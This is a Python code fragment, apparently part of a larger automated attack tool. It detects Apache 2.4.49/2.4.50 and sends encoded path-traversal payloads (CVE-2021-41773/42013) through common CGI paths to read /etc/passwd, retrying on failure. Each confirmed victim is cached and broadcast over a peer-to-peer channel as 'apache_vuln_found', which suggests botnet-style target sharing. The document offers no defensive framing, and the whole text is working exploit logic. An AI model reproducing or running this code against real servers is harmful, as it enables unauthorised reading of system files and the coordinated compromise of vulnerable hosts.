        status, server_header, _ = self._send_raw_http(target_ip, target_port, "/")
        if not server_header:
            return False
            
        is_449 = "Apache/2.4.49" in server_header
        is_450 = "Apache/2.4.50" in server_header
        
        # While the vulnerability is specific to these versions, we'll allow testing if version is hidden
        # But we prioritize the correct encoding based on version if known.
        encodings_to_try = []
        if is_450:
            encodings_to_try = ["%25%32%65%25%32%65/%25%32%65%25%32%65/%25%32%65%25%32%65/%25%32%65%25%32%65"]
        elif is_449:
            encodings_to_try = [".%2e/.%2e/.%2e/.%2e"]
        else:
            encodings_to_try = [".%2e/.%2e/.%2e/.%2e", "%25%32%65%25%32%65/%25%32%65%25%32%65/%25%32%65%25%32%65/%25%32%65%25%32%65"]
        
        cgi_paths = ["/cgi-bin/", "/icons/", "/scripts/", "/cgi/"]
        
        for traversal in encodings_to_try:
            for base_cgi in cgi_paths:
                path = f"{base_cgi}{traversal}/etc/passwd"
                
                for attempt in range(3):
                    status, _, body = self._send_raw_http(target_ip, target_port, path)
                    
                    if status == 200 and "root:x:0:0:" in body:
                        self.logger.info(f"ðŸŽ¯ [APACHE] Verified CVE-2021-41773/42013 on {target_ip}:{target_port}")
                        with self.lock:
                            self.verified_targets[cache_key] = {"ts": time.time(), "ip": target_ip, "port": target_port}
                        if self.p2pmanager:
                            self.p2pmanager.broadcast("apache_vuln_found", {"ip": target_ip, "port": target_port, "ts": time.time()})
                        return True
                    elif status != 0:
                        break # Got an HTTP response (404/403) so path is invalid, try next
                    time.sleep(2 ** attempt)
                    
        return False

